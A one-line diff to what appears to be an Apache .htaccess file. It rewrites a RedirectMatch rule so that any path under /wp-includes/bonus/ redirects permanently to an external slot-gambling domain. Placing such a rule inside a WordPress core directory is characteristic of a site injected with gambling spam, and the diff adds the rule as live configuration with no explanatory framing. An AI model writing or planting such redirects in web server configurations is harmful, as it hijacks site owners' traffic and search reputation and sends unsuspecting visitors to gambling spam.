@@ -1,1 +1,1 @@
-RedirectMatch 301 /bonus/(.*) https://slot1131.rent/sgi/gacor/$1
+RedirectMatch 301 /wp-includes/bonus/(.*) https://slot1131.rent/sgi/gacor/$1
